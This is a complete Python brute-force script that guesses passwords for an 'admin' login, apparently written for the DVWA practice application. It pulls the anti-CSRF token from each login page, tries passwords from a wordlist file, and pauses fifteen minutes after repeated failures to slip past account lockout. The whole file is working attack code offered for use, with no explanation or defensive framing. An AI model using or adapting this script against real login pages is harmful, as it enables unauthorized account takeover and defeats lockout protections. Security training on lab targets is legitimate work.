#!/usr/bin/env python3$
# Bruteforce script

import requests
import re
from cmd import Cmd
import sys
import time

class Terminal(Cmd):
	intro="DVWA Bruteforcer"
	prompt="URL >>> "
	def default(self, args):
		bruteforcer(args)

def bruteforcer(url):
	counter=1
	with open("sample.txt") as file:
		content = file.readlines()
		passwords = [x.strip() for x in content]
		for password in passwords:
			session = requests.session()
			login = session.get(f"{url}")
			user_token=re.search("'user_token' value='(.*?)'", login.text).group(1)
			print(f"user token : {user_token}\n")
			post_data = {
				"username":"admin",
				"password":password,
				"Login":"Login",
				"user_token":user_token
				}
			validation = session.post(f"{url}#",data=post_data)
			if "Username and/or password incorrect." in validation.text:
				print(f"Attempt {password} failed")
				counter+=1
				if counter==3:
					print("Waiting for unlock")
					time.sleep(15*60)
					counter=1
			else:
				print(f"Login successful ! \nYour credentials below\n{post_data['username']}:{password}")
				sys.exit()


if __name__ == ("__main__"):
	terminal = Terminal()
	terminal.cmdloop()
